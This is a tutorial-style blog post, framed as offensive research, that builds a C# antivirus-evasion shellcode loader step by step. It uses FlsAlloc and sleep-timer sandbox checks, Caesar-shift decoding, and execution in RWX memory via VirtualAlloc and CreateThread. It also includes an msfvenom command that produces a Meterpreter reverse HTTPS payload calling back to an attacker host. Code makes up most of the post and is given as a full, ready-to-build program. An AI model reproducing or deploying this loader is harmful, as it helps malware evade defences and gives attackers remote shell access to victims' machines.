---
title: "Bypassing Antivirus Detection with Unusual Windows APIs, Delayed Timers, and Encryption"
seoTitle: "Antivirus Evasion with Windows APIs and Delayed Execution"
description: "A technical walkthrough of Windows sandbox-evasion primitives using FlsAlloc, delayed execution, Caesar encoding, and in-memory code execution."
deck: "A controlled lab study of unusual Windows APIs, execution delays, and lightweight encoding as building blocks for studying defensive blind spots."
slug: "bypassing-antivirus-detection-with-unusual-windows-apis-delayed-timers-and-encryption"
file: "04"
publishedAt: "2025-03-31T06:32:56.862Z"
updatedAt: "2026-08-02T00:00:00.000Z"
category: "Offensive Research"
tags:
  - "Windows"
  - "AV Evasion"
  - "FlsAlloc"
  - "Offensive Security"
coverImage: "/images/posts/windows-av-evasion-cover.webp"
coverImageAlt: "Windows process and memory illustration for an antivirus-evasion research lab"
coverImageWidth: 1792
coverImageHeight: 1024
status: "Published"
draft: false
---
This lab builds a C# console application around three evasion primitives: execution delays, the less commonly emulated `FlsAlloc` API, and Caesar cipher encoding. The implementation is developed one component at a time so each behavior can be observed independently.

## Step 1: Setting Up the Environment

First, we need to set up a new C# console application. Open Visual Studio and create a new project by selecting “Console App (.NET Core)” or “Console App (.NET Framework)”, depending on your preference.

Next, add the necessary namespaces and import the required functions from `kernel32.dll` using the `DllImport` attribute. This will allow us to use various Windows API functions in our application.

```csharp
using System;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint FlsAlloc(IntPtr lpCallback);

        static void Main(string[] args)
        {
            // Main logic will go here
        }
    }
}
```

## Step 2: Using the FlsAlloc API

The `FlsAlloc` function is a Windows API that allocates a fiber local storage (FLS) index. This API is not typically emulated in sandbox environments, making it a useful tool for detecting whether the application is running in such an environment.

Add the following code to the `Main` method to allocate an FLS index and check if it was successful:

```csharp
static void Main(string[] args)
{
    uint flsIndex = FlsAlloc(IntPtr.Zero);
    if (flsIndex == 0xFFFFFFFF) // FLS_OUT_OF_INDEXES
    {
        return;
    }

    // Proceed with the simulation detection logic here
    // This part is illustrative. Real detection logic needs to be more sophisticated
    // and tailored to the specific behaviors of simulated environments.
}
```

## Step 3: Implementing Sleep Timers

Sleep timers can be used to delay the execution of the program, which can help to detect sandbox environments that often skip or minimize sleep durations to speed up analysis.

Add the following code to measure the actual sleep duration:

```csharp
DateTime t1 = DateTime.Now;
Sleep(2000); // Sleep for 2 seconds
double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
if (t2 < 1.5)
{
    return;
}
```

In this snippet, we record the current time, sleep for 2 seconds, and then measure the elapsed time. If the elapsed time is less than 1.5 seconds, we assume the program is running in a sandbox and exit.

## Step 4: Implementing Caesar Cipher Encryption

The Caesar cipher is a simple encryption technique that shifts each byte by a fixed number of positions. In this case, we will shift each byte by 2 positions to the left.

Generate the shellcode using `msfvenom`

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.1 LPORT=443 -f csharp
```

Add the following code to decrypt a byte array using a Caesar cipher:

```csharp
byte[] buf = new byte[687] { 0xfe, 0xb7, 0xa4, 0x58, 0x01, 0xd7 }; // Example byte array

for (int i = 0; i < buf.Length; i++)
{
    buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF); // Shift each byte by 2 positions
}
```

This code initializes a byte array and decrypts each byte by shifting it 2 positions to the left.

## Step 5: Allocating Memory and Executing Code

To allocate memory and execute code, we will use the `VirtualAlloc` and `CreateThread` functions. This allows us to copy the decrypted byte array into executable memory and create a thread to execute it.

Add the following code to allocate memory, copy the byte array, and create a thread:

```csharp
int size = buf.Length;
IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
Marshal.Copy(buf, 0, addr, size);

IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
WaitForSingleObject(hThread, 0xFFFFFFFF);
```

This snippet allocates a memory region, copies the decrypted byte array into it, creates a thread to execute the code, and waits for the thread to complete.

## Full Code

Here is the complete code with all the features integrated:

```csharp
using System;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint FlsAlloc(IntPtr lpCallback);

        static void Main(string[] args)
        {
            uint flsIndex = FlsAlloc(IntPtr.Zero);
            if (flsIndex == 0xFFFFFFFF) // FLS_OUT_OF_INDEXES
            {
                return;
            }

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            byte[] buf = new byte[687] { 0xfe, 0xb7, 0xa4, 0x58, 0x01, 0xd7 };
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
            }

            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```
